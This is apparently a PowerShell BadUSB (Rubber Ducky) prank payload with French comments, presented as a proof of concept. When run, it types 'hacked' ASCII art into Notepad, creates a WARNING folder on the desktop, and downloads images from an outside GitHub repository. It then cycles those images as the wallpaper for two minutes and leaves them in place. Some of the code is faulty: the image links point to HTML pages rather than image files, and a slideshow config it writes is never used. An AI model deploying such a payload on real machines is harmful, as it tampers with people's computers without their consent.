function Payload_Launch {

    OpenNotepad
    CreateWarningSlideshow

}

function OpenNotepad {
    # Open Notepad
    Start-Process notepad
    Start-Sleep -Seconds 2
    
    # Writes the specified text
    $wshell = New-Object -ComObject wscript.shell
    $wshell.AppActivate('Notepad')
    Start-Sleep -Seconds 1
    $wshell.SendKeys("
 _                _            _ 
| |              | |          | |
| |__   __ _  ___| | _____  __| |
| '_ \ / _` |/ __| |/ / _ \/ _` |
| | | | (_| | (__|   <  __/ (_| |
|_| |_|\__,_|\___|_|\_\___|\__,_|
  `r`n")
    Start-Sleep -Seconds 5

    # Fermer le Bloc-notes directement via le processus
    $notepad = Get-Process notepad -ErrorAction SilentlyContinue
    if ($notepad) {
        $notepad.Kill()
    }
}

function CreateWarningSlideshow {
    # Prendre le nom d'utilisateur et le stocker
    $username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    # Chemin du dossier "WARNING" sur le bureau
    $desktopPath = [Environment]::GetFolderPath('Desktop')
    $warningFolderPath = Join-Path $desktopPath "WARNING"

    # Créer le dossier "WARNING" s'il n'existe pas
    if (-not (Test-Path $warningFolderPath)) {
        New-Item -Path $warningFolderPath -ItemType Directory | Out-Null
    }

    # Prendre le fond d'écran actuel et le stocker dans le dossier "WARNING"
    $currentWallpaperPath = (Get-ItemProperty 'HKCU:\Control Panel\Desktop\' -Name WallPaper).WallPaper
    $currentWallpaperFilename = [System.IO.Path]::GetFileName($currentWallpaperPath)
    $backupWallpaperPath = Join-Path $warningFolderPath $currentWallpaperFilename
    Copy-Item -Path $currentWallpaperPath -Destination $backupWallpaperPath -ErrorAction SilentlyContinue

    # URLs des images pour le diaporama
    $imageURLs = @(
        "https://github.com/Gvte-Kali/BadStuffHosting/blob/main/BadUSB/RubberDucky_PoC/1.jpeg",
        "https://github.com/Gvte-Kali/BadStuffHosting/blob/main/BadUSB/RubberDucky_PoC/2.jpg",
        "https://github.com/Gvte-Kali/BadStuffHosting/blob/main/BadUSB/RubberDucky_PoC/3.jpg",
        "https://github.com/Gvte-Kali/BadStuffHosting/blob/main/BadUSB/RubberDucky_PoC/4.jpg"
    )

    # Télécharger les images dans le dossier "WARNING"
    $downloadedImages = @()
    foreach ($url in $imageURLs) {
        $filename = [System.IO.Path]::GetFileName($url)
        $destinationPath = Join-Path $warningFolderPath $filename
        Invoke-WebRequest -Uri $url -OutFile $destinationPath
        $downloadedImages += $destinationPath
    }

    # Créer le fichier de configuration du diaporama avec un intervalle de 2 secondes pour chaque image
    $slideshowConfig = @"
[Slideshow]
Interval=2
[Path]
${desktopPath}
"@

    $slideshowConfigPath = Join-Path $warningFolderPath "slideshow.ini"
    Set-Content -Path $slideshowConfigPath -Value $slideshowConfig

    # Mettre en place le diaporama comme fond d'écran
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

    # Durée totale du diaporama en secondes (2 secondes par image, 4 images)
    $totalDuration = 2 * $downloadedImages.Count  # 2 secondes par image * nombre d'images

    # Loop pendant 2 minutes (120 secondes)
    $endTime = [DateTime]::Now.AddMinutes(2)
    while ([DateTime]::Now -lt $endTime) {
        foreach ($image in $downloadedImages) {
            [Wallpaper]::SystemParametersInfo(0x0014, 0, $image, 0x0001 -bor 0x0002)
            Start-Sleep -Seconds 2
        }
    }
}


# Ouvre un nouveau mail via Outlook
function OutlookNewMail {
    $olApp = New-Object -ComObject Outlook.Application
    $mailItem = $olApp.CreateItem(0) # 0: olMailItem
    $mailItem.Display()
}

Payload_Launch
